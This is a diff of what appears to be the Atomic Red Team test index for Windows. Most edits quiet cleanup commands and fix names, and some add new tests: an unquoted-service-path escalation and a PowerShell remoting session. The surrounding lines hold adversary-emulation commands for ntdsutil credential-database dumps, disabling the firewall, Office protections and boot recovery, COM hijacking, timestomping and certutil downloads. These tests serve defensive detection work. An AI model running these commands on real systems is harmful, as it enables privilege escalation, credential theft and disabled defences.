@@ -550,7 +550,7 @@ privilege-escalation:
         command: 'reg.exe import #{registry_file}
 
 '
-        cleanup_command: 'reg.exe import #{registry_cleanup_file}
+        cleanup_command: 'reg.exe import #{registry_cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -666,7 +666,7 @@ privilege-escalation:
         command: 'sdbinst.exe #{file_path}
 
 '
-        cleanup_command: 'sdbinst.exe -u #{file_path}
+        cleanup_command: 'sdbinst.exe -u #{file_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -1483,7 +1483,7 @@ privilege-escalation:
         command: 'assoc #{extension_to_change}=#{target_extension_handler}
 
 '
-        cleanup_command: 'assoc .hta=htafile
+        cleanup_command: 'assoc .hta=htafile >nul 2>&1
 
 '
         name: command_prompt
@@ -1659,12 +1659,12 @@ privilege-escalation:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-        cleanup_command: |
-          Write-Host "Removing registry keys" -ForegroundColor Cyan
-          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+        cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"
+          -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment
+          -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty
+          -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore
+          | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"
+          -Force -ErrorAction Ignore | Out-Null\n"
         name: powershell
     - name: COM Hijack Leveraging System Scope COR_PROFILER
       auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
@@ -1698,10 +1698,9 @@ privilege-escalation:
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
         cleanup_command: |
-          Write-Host "Removing system environment variables" -ForegroundColor Cyan
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
@@ -4532,7 +4531,36 @@ privilege-escalation:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1547.011:
     technique:
       id: attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a
@@ -6269,19 +6297,19 @@ privilege-escalation:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -6294,7 +6322,7 @@ privilege-escalation:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -8510,7 +8538,7 @@ persistence:
         command: 'reg.exe import #{registry_file}
 
 '
-        cleanup_command: 'reg.exe import #{registry_cleanup_file}
+        cleanup_command: 'reg.exe import #{registry_cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -8626,7 +8654,7 @@ persistence:
         command: 'sdbinst.exe #{file_path}
 
 '
-        cleanup_command: 'sdbinst.exe -u #{file_path}
+        cleanup_command: 'sdbinst.exe -u #{file_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -9457,7 +9485,7 @@ persistence:
         command: 'assoc #{extension_to_change}=#{target_extension_handler}
 
 '
-        cleanup_command: 'assoc .hta=htafile
+        cleanup_command: 'assoc .hta=htafile >nul 2>&1
 
 '
         name: command_prompt
@@ -9752,12 +9780,12 @@ persistence:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-        cleanup_command: |
-          Write-Host "Removing registry keys" -ForegroundColor Cyan
-          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+        cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"
+          -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment
+          -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty
+          -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore
+          | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"
+          -Force -ErrorAction Ignore | Out-Null\n"
         name: powershell
     - name: COM Hijack Leveraging System Scope COR_PROFILER
       auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
@@ -9791,10 +9819,9 @@ persistence:
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
           New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
         cleanup_command: |
-          Write-Host "Removing system environment variables" -ForegroundColor Cyan
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
-          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
@@ -12905,7 +12932,36 @@ persistence:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1547.011:
     technique:
       id: attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a
@@ -14327,19 +14383,19 @@ persistence:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -14352,7 +14408,7 @@ persistence:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -15089,9 +15145,11 @@ persistence:
           Enable-TransportAgent #{transport_agent_identity}
           Get-TransportAgent | Format-List Name,Enabled
         cleanup_command: |
-          Disable-TransportAgent #{transport_agent_identity}
-          Uninstall-TransportAgent #{transport_agent_identity}
-          Get-TransportAgent
+          if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
+            Disable-TransportAgent #{transport_agent_identity}
+            Uninstall-TransportAgent #{transport_agent_identity}
+            Get-TransportAgent
+          }
         name: powershell
         elevation_required: true
   T1546.005:
@@ -18246,7 +18304,7 @@ credential-access:
         command: |
           mkdir #{output_folder}
           ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
-        cleanup_command: 'rmdir /q /s #{output_folder}
+        cleanup_command: 'rmdir /q /s #{output_folder} >nul 2>&1
 
 '
         name: command_prompt
@@ -18441,26 +18499,6 @@ credential-access:
           "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
         name: command_prompt
-        elevation_required: true
-    - name: Packet Capture PowerShell
-      auto_generated_guid: 2bf62970-013a-4c74-b0a8-64030874e89a
-      description: |
-        Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark
-        installed, along with WinPCAP. Windump will require the windump executable.
-
-        Upon successful execution, tshark will spawn from powershell and capture 5 packets on interface Ethernet0.
-      supported_platforms:
-      - windows
-      input_arguments:
-        interface:
-          description: Specify interface to perform PCAP on.
-          type: String
-          default: Ethernet0
-      executor:
-        command: |
-          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
-          & c:\windump.exe
-        name: powershell
         elevation_required: true
   T1003:
     technique:
@@ -22179,10 +22217,10 @@ defense-evasion:
           /section:httplogging /dontLog:true
 
 '
-        cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
-          /section:httplogging /dontLog:false
-
-'
+        cleanup_command: |
+          if(Test-Path "C:\Windows\System32\inetsrv\appcmd.exe"){
+            C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false *>$null
+          }
         name: powershell
   T1562.004:
     technique:
@@ -22255,7 +22293,7 @@ defense-evasion:
         command: 'netsh advfirewall set currentprofile state off
 
 '
-        cleanup_command: 'netsh advfirewall set currentprofile state on
+        cleanup_command: 'netsh advfirewall set currentprofile state on >nul 2>&1
 
 '
         name: command_prompt
@@ -22270,7 +22308,7 @@ defense-evasion:
         command: |
           netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
           netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
-        cleanup_command: 'netsh advfirewall reset
+        cleanup_command: 'netsh advfirewall reset >nul 2>&1
 
 '
         name: command_prompt
@@ -22286,7 +22324,7 @@ defense-evasion:
         command: "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow
           dir=in protocol=TCP localport=450 \n"
         cleanup_command: netsh advfirewall firewall delete rule name="atomic testing"
-          protocol=TCP localport=450
+          protocol=TCP localport=450 >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1562.001:
@@ -22654,7 +22692,7 @@ defense-evasion:
 '
         name: powershell
         elevation_required: true
-    - name: Disable Microft Office Security Features
+    - name: Disable Microsoft Office Security Features
       auto_generated_guid: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
       description: |
         Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
@@ -22674,8 +22712,8 @@ defense-evasion:
           New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
           New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
         cleanup_command: |
-          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
-          Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -ErrorAction Ignore | Out-Null
+          Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -ErrorAction Ignore
         name: powershell
     - name: Remove Windows Defender Definition Files
       auto_generated_guid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
@@ -24625,7 +24663,7 @@ defense-evasion:
       x_mitre_is_subtechnique: false
       identifier: T1551
     atomic_tests:
-    - name: FSUtil
+    - name: Indicator Removal using FSUtil
       auto_generated_guid: b4115c7a-0e92-47f0-a61e-17e7218b2435
       description: |
         Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output
@@ -24937,7 +24975,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }'
         get_prereq_command: |-
           $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
-          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$cert.Thumbprint -FilePath #{pfx_path}
+          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
       executor:
         command: |
@@ -24945,9 +24983,9 @@ defense-evasion:
           Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
         cleanup_command: |
           $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
-          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
-          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) | Remove-Item
-        name: command_prompt
+          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+        name: powershell
         elevation_required: true
   T1218.004:
     technique:
@@ -27391,7 +27429,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
-          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\"
+          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
       executor:
         command: '"#{exe_payload}"
 
@@ -28076,7 +28114,36 @@ defense-evasion:
       - Stefan Kanthak
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1574.009
+    atomic_tests:
+    - name: Execution of program.exe as service with unquoted service path
+      auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+      description: |
+        When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+        known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+        In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_executable:
+          description: Path of the executable used for the service and as the hijacked
+            program.exe
+          type: path
+          default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
+      executor:
+        command: |
+          copy #{service_executable} "C:\Program Files\windows_service.exe"
+          copy #{service_executable} "C:\program.exe"
+          sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+          sc start "Example Service"
+        cleanup_command: |
+          sc stop "Example Service"
+          sc delete "Example Service"
+          del "C:\Program Files\windows_service.exe"
+          del "C:\program.exe"
+          del "C:\Time.log"
+        name: command_prompt
+        elevation_required: true
   T1545.001:
     technique:
       external_references:
@@ -30291,19 +30358,19 @@ defense-evasion:
         powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
         copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
 
-        Upon execution, open the weak permission file at %temp%\ T1574.010_weak_permission_file.txt and verify that it's contents read " T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\ T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         malicious_file:
           description: File to replace weak permission file with
           type: path
-          default: "$env:TEMP\\ T1574.010\\ T1574.010_malicious_file.txt"
+          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: "$env:TEMP\\ T1574.010_weak_permission_file.txt"
+          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: A file must exist on disk at specified location (#{weak_permission_file})
@@ -30316,7 +30383,7 @@ defense-evasion:
           this would be the malicious file gaining extra privileges
         prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
-          New-Item -Type Directory -Path $env:TEMP\ T1574.010\ -Force | Out-Null
+          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
       executor:
@@ -31918,9 +31985,7 @@ defense-evasion:
           import-module #{file_path}\timestomp.ps1
           timestomp -dest "#{file_path}\kxwn.lock"
         cleanup_command: |-
-          Write-Host "Removing #{file_path}\timestomp.ps1"
           Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-          Write-Host "Removing #{file_path}\kxwn.lock"
           Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
         name: powershell
   T1134.001:
@@ -33982,8 +34047,8 @@ impact:
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
         cleanup_command: |
-          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
-          bcdedit.exe /set {default} recoveryenabled yes
+          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
+          bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
         name: command_prompt
         elevation_required: true
     - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
@@ -36659,26 +36724,6 @@ discovery:
           "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
         name: command_prompt
-        elevation_required: true
-    - name: Packet Capture PowerShell
-      auto_generated_guid: 2bf62970-013a-4c74-b0a8-64030874e89a
-      description: |
-        Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark
-        installed, along with WinPCAP. Windump will require the windump executable.
-
-        Upon successful execution, tshark will spawn from powershell and capture 5 packets on interface Ethernet0.
-      supported_platforms:
-      - windows
-      input_arguments:
-        interface:
-          description: Specify interface to perform PCAP on.
-          type: String
-          default: Ethernet0
-      executor:
-        command: |
-          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
-          & c:\windump.exe
-        name: powershell
         elevation_required: true
   T1201:
     technique:
@@ -39903,6 +39948,7 @@ execution:
           -contains "NTFS") {exit 0} else {exit 1}
         get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
+        name: powershell
         command: |
           Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
           $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
@@ -39910,7 +39956,33 @@ execution:
         cleanup_command: 'Remove-Item #{ads_file} -Force -ErrorAction Ignore
 
 '
+    - name: PowerShell Session Creation and Use
+      auto_generated_guid: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
+      description: |
+        Connect to a remote powershell session and interact with the host.
+        Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        hostname_to_connect:
+          description: The host to connect to, by default it will connect to the local
+            machine
+          type: String
+          default: "$env:COMPUTERNAME"
+      dependencies:
+      - description: PSRemoting must be enabled
+        prereq_command: "Try {\n    New-PSSession -ComputerName #{hostname_to_connect}
+          -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}"
+        get_prereq_command: Enable-PSRemoting
+      executor:
         name: powershell
+        elevation_required: true
+        command: |
+          New-PSSession -ComputerName #{hostname_to_connect}
+          Test-Connection $env:COMPUTERNAME
+          Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+          Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+          Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
   T1059.006:
     technique:
       external_references:
@@ -44000,7 +44072,7 @@ command-and-control:
         command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 
 '
-        cleanup_command: 'del #{local_path}
+        cleanup_command: 'del #{local_path} >nul 2>&1
 
 '
         name: command_prompt
@@ -44257,6 +44329,7 @@ command-and-control:
         command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
           connectaddress=#{connectaddress}
         cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
+          -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
   T1001.001:
@@ -45111,9 +45184,10 @@ command-and-control:
           Start-Process $file1 /S;
           Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
         cleanup_command: |-
-          Start-Process 'C:\Program Files (x86)\TeamViewer\uninstall.exe' "/S"
+          $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
+          if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
           $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
-          Remove-Item $file1
+          Remove-Item $file1 -ErrorAction Ignore | Out-Null
         name: powershell
         elevation_required: true
     - name: AnyDesk Files Detected Test on Windows
@@ -45132,7 +45206,7 @@ command-and-control:
           Start-Process $file1 /S;
         cleanup_command: |-
           $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe.exe"
-          Remove-Item $file1
+          Remove-Item $file1 -ErrorAction Ignore
         name: powershell
         elevation_required: true
     - name: LogMeIn Files Detected Test on Windows
@@ -45150,10 +45224,9 @@ command-and-control:
           $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
           Start-Process $file1 /S;
           Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
-        cleanup_command: |-
-          get-package *'LogMeIn Client'* | uninstall-package
-          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
-          Remove-Item $file1
+        cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
+          \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
+          $file1 -ErrorAction Ignore"
         name: powershell
         elevation_required: true
   T1132.001:
@@ -46122,7 +46195,7 @@ collection:
           New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
           Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
         cleanup_command: 'Remove-Item $env:TEMP\T1119_powershell_collection -Force
-          | Out-Null
+          -ErrorAction Ignore | Out-Null
 
 '
         name: powershell
@@ -46224,7 +46297,7 @@ collection:
 
 '
         name: command_prompt
-    - name: PowerShell
+    - name: Execute Commands from Clipboard using PowerShell
       auto_generated_guid: d6dc21af-bec9-4152-be86-326b6babd416
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
